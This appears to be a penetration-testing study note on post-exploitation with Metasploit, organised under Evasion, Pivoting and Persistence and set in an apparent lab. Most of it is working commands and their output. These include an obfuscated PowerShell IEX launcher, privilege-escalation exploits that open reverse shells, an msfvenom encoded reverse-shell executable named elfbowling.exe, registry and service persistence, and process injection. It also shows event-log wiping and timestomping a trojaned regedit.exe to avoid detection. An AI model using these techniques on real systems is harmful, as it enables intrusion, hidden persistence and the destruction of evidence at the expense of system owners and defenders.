## Table of Contents

      - [Evasion](#Evasion)
  - [Pivoting](#Pivoting)
  - [Persistence](#Persistence)

#### Evasion
EDR Software will usually know what attack techniques look like. Common/well-known tools are often detected unless evasive action is taken.


- One possible place where evasion needs to happen is detecting files, primarily on disk. You may be able to use techniques like alternate data streams mentioned later. You can also encrypt/obfuscate data.

```powershell
$N7 =[char[ ] ] "noisserpxE-ekovnI| )93]rahC[,'pQm'ecalpeR-  
43]rahC[,'bg0'ecalpeR- )')pQm'+'nepQ'+'m+pQme'+'rGpQm'+'  
( '+'roloCdnu'+'orger'+'oF- )bg0nbg0'+'+ bg0oibg0'+' +  
bg0tacbg0'+'+'+'bg0sufbO-b'+'g'+'0+'+'bg0ek'+'ovn'+'bg0+ bg0Ib'+'g'+'0 '+' (  
)'+'bg'+'0tsO'+'bg0'+' + bg'+'0H'+'-'+'ebg0 '+' '+'+ b'+'g0'+'tIRwb'+'g0(.  
'((";[Array]::Reverse($N7 ) ; IEX ($N7-Join '' )
```
  
This translates to `Invoke‐Obfuscation`, which is a cmdlet written by Daniel Bohannon that takes a PowerShell script and obfuscates it. There are different ways to accomplish the obfuscation, as demonstrated when you run the cmdlet without any parameters. The following are the techniques you can use for obfuscating PowerShell using this cmdlet:  
  

Choose one of the below options:  
 ```powershell
[*] TOKEN Obfuscate PowerShell command Tokens  
[*] AST Obfuscate PowerShell Ast nodes (PS3.0+)  
[*] STRING Obfuscate entire command as a String  
[*] ENCODING Obfuscate entire command via Encoding  
[*] COMPRESS Convert entire command to one-liner and Compress  
[*] LAUNCHER Obfuscate command args w/Launcher techniques (run once at end)
```


To get our limited permissions escalated, we need to identify a local exploit. One way of doing this is to use the Python script `windows‐exploit‐suggester.py`. This is a script that can be downloaded from GitHub. It requires a couple of things to run beyond a Python interpreter. First is the output from `systeminfo`. Second is the database containing the Microsoft security bulletins (MSSB) information. To get the first, we'll pull it from our exploited Windows system. We can drop to a Windows shell from Meterpreter and run `systeminfo`, redirecting the output to a file, and then we can pull that file back to our local system. You can see that process in the following listing.  
  
**Getting System Patch Information**  
  

```powershell
meterpreter> shell  
Process 3 created.  
Channel 3 created.  
Microsoft Windows [Version 6.1.7601]  
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.  
  
C:\Program Files\elasticsearch-1.1.1>systeminfo> patches.txt  
systeminfo> patches.txt  
  
C:\Program Files\elasticsearch-1.1.1>exit  
exit  
meterpreter> download patches.txt  
[*] Downloading: patches.txt -> patches.txt  
[*] Downloaded 2.21 KiB of 2.21 KiB (100.0%): patches.txt -> patches.txt  
[*] download : patches.txt -> patches.txt
```

Once we have the patch information, we can move on to using `windows-exploit-suggester`
- First get an updated MSSB database, then run the script with out two files, looking for local exploits. 


**Getting Local Exploit Suggestions**  
  

```bash
root@quiche:~# ./windows-exploit-suggester.py --update  
[*] initiating winsploit version 3.3…  
[+] writing to file 2023-01-09-mssb.xls  
[*] done  
root@quiche:~# ./windows-exploit-suggester.py -i patches.txt -d 2023-01-09-mssb.xls -l  
[*] initiating winsploit version 3.3…  
[*] database file detected as xls or xlsx based on extension  
[*] attempting to read from the systeminfo input file  
[+] systeminfo input file read successfully (ascii)  
[*] querying database file for potential vulnerabilities  
[*] comparing the 2 hotfix(es) against the 407 potential bulletins(s) with a database of 137 known exploits  
[*] there are now 407 remaining vulns  
[*] searching for local exploits only  
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin  
[+] windows version identified as 'Windows 2008 R2 SP1 64-bit'  
[*]  
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important  
[*] https://github.com/foxglovesec/RottenPotato  
[*] https://github.com/Kevin‐Robertson/Tater  
[*] https://bugs.chromium.org/p/project‐zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege  
--- snip ---  
[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important  
[*] http://www.exploit‐db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC  
[*]  
[*] done
```

Some of the suggested exploits won't run against Windows on Windows (WoW) 64. This is a subsystem that allows 32-bit Windows executables to execute on 64-bit Windows installations. The exploit would need the ability to run within this subsystem and still be able to exploit the vulnerability. As there is an additional layer of software on 64-bit Windows, some exploit just won't work. 

**Searching for Local Exploit**  
  
```powershell
msf exploit(windows/local/ms15_051_client_copy_image)> search MS16-032  
  
Matching Modules  
================  
  
      Name                                                             Disclosure Date  Rank    Description  
      ----                                                             ---------------  ----    -----------  
   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  2016-03-21       normal  MS16-032 Secondary Logon Handle Privilege Escalation  
  
  
   exploit(windows/local/ms15_051_client_copy_image)> use exploit/windows/local/ms16_032_secondary_logon_
```



**Using Local Exploit from Metasploit**  
  
```powershell
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc)> set SESSION 2  
SESSION => 2  
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc)> set LHOST 192.168.86.57  
LHOST => 192.168.86.57  
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc)> set LPORT 4445  
LPORT => 4445  
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc)> exploit  
  
[*] Started reverse TCP handler on 192.168.86.57:4445  
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell  
[*] Writing payload file, C:\ManageEngine\DesktopCentral_Server\bin\ROayyKQ.txt…  
[*] Compressing script contents…  
[+] Compressed size: 3621  
[*] Executing exploit script…
```


**Linux Privilege Escalation**  
  

```bash
Msf6> use exploit/unix/misc/distcc_exec  
msf exploit(unix/misc/distcc_exec)> set RHOST 192.168.86.66  
RHOST => 192.168.86.66  
msf exploit(unix/misc/distcc_exec)> exploit  
  
[*] Started reverse TCP double handler on 192.168.86.57:4444  
[*] Accepted the first client connection…  
[*] Accepted the second client connection…  
[*] Command: echo 9LVs5a2CaAEk29pj;  
[*] Writing to socket A  
[*] Writing to socket B  
[*] Reading from sockets…  
[*] Reading from socket B  
[*] B: "9LVs5a2CaAEk29pj\r\n"  
[*] Matching…  
[*] A is input…  
[*] Command shell session 1 opened (192.168.86.57:4444 -> 192.168.86.66:47936) at 2023-01-09 18:28:22 -0600  
  
whoami  
daemon  
cd /tmp  
ps auxww | grep udev  
root      2663  0.0  0.1   2216   700 ?        S<s  Apr24   0:00 /sbin/udevd --daemon  
daemon    6364  0.0  0.1   1784   532 ?        RN   11:54   0:00 grep udev  
./escalate 2662
```


## Pivoting
You may find after compromising a system that it has multiple interfaces. Because we can't just upload a bunch of tools to the compromised system, we need

`ipconfig` - Get IP Configuration

`autoroute` - Module used for adding route's to a network by way of the session we have open. 

## Persistence
**Registry Persistence from Metasploit**  
  

```bash
meterpreter> getuid  
Server username: NT AUTHORITY\LOCAL SERVICE  
meterpreter> background  
[*] Backgrounding session 1…  
msf exploit(windows/http/manageengine_connectionid_write)> use exploit/windows/local/registry_persistence  
msf exploit(windows/local/registry_persistence)> set SESSION 1  
SESSION => 1  
msf exploit(windows/local/registry_persistence)> exploit  
  
[*] Generating payload blob..  
[+] Generated payload, 5968 bytes  
[*] Root path is HKCU  
[*] Installing payload blob..  
[+] Created registry key HKCU\Software\hO2pqzTh  
[+] Installed payload blob to HKCU\Software\hO2pqzTh\kASCvdW3  
[*] Installing run key
```

**Using `msfvenom` to Create Stand‐Alone Payload**  
  
```bash
root@quiche:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.57 LPORT=3445 -f exe -e x86/shikata_ga_nai -a x86 -i 3 -o elfbowling.exe
```

**Creating the Meterpreter Service on Target**  
  

```powershell
meterpreter> run metsvc  
  
[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence:exe.  
[!] Example: run post/windows/manage/persistence:exe OPTION=value […]  
[*] Creating a meterpreter service on port 31337  
[*] Creating a temporary installation directory C:\Windows\SERVIC~2\LOCALS~1\AppData\Local\Temp\KrUjwJQb…  
[*]>> Uploading metsrv.x86.dll…  
[*]>> Uploading metsvc-server.exe…  
[*]>> Uploading metsvc.exe…  
[*] Starting the service…
```


**Using the Metasploit Module for Persistence**  
  

```powershell
meterpreter> run post/windows/manage/persistence:exe REXEPATH=/root/elfbowling.exe  
  
[*] Running module against VAGRANT-2008R2  
[*] Reading Payload from file /root/elfbowling.exe  
[+] Persistent Script written to C:\Windows\SERVIC~2\LOCALS~1\AppData\Local\Temp\default.exe  
[*] Executing script C:\Windows\SERVIC~2\LOCALS~1\AppData\Local\Temp\default.exe  
[+] Agent executed with PID 5672  
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\qWQPRsRzw  
[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\qWQPRsRzw  
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/VAGRANT-2008R2_22230112.4749/VAGRANT-2008R2_2230112.4749.rc
```

**Process Injection Module**  
  
```

meterpreter> run post/windows/manage/multi_meterpreter_inject PID=3940 PAYLOAD=windows/shell_bind_tcp  

[*] Running module against VAGRANT-2008R2  
[*] Creating a reverse meterpreter stager: LHOST=192.168.86.57 LPORT=4444  
[+] Starting Notepad.exe to house Meterpreter Session.  
[+] Process created with pid 1296  
[*] Injecting meterpreter into process ID 1296  
[*] Allocated memory at address 0x00170000, for 328 byte stager  
[*] Writing the stager into memory…  
[+] Successfully injected Meterpreter in to process: 1296  
< snip>  
msf> connect 192.168.86.25 4444  
[*] Connected to 192.168.86.25:4444  
Microsoft Windows [Version 6.1.7601]  
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.  
  
C:\ManageEngine\DesktopCentral_Server\bin>
```

**Process Migration with Meterpreter**  
  

```
meterpreter> run post/windows/manage/migrate  
  
  
[*] Running module against VAGRANT-2008R2  
[*] Current server process: NepqI.jsp (5624)  
[*] Spawning notepad.exe process to migrate to  
[+] Migrating to 6012  
[+] Successfully migrated to process 6012  
meterpreter>
```
What we achieve through the use of process migration is to ideally evade detection by endpoint protection solutions. Any action taking place will be done from the process space of an existing and unsuspicious process, even if the behaviors may be suspicious. As with other techniques discussed in this lesson, the important idea is to keep from getting detected. Running malicious code in a process that won't earn much in the way of notice is a good way of maintaining access without getting detected.


**Clearing Event Viewer with Meterpreter**  
  
```
meterpreter> clearev  
[*] Wiping 635 records from Application…  
[-] stdapi_sys_eventlog_clear: Operation failed: Access is denied.  
meterpreter> getuid  
Server username: NT AUTHORITY\LOCAL SERVICE
```
**Time Management**  
Files in a file system all have dates and times associated with them. You will commonly have modified, accessed, and created dates for each file. If you were to try to replace a common file in the file system with a Trojan that contained a payload you had created, it would have the time stamps associated with the file you were uploading. That makes it more detectable. Instead, you can modify the times of files. Again, we turn to Meterpreter. In the following code, you can see the use of `timestomp` to manipulate the times of a file. Using `timestomp`, we can set the times on a file we uploaded, which are identical to the time stamps on the legitimate file. When we move our replacement file into place, it will have the correct times.  
  
**Timestomping Files**  
  
```
meterpreter> upload regedit.exe  
[*] uploading : regedit.exe -> regedit.exe  
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): regedit.exe -> regedit.exe  
[*] uploaded : regedit.exe -> regedit.exe  
meterpreter> timestomp regedit.exe -f /windows/regedit.exe  
[*] Pulling MACE attributes from /windows/regedit.exe
```




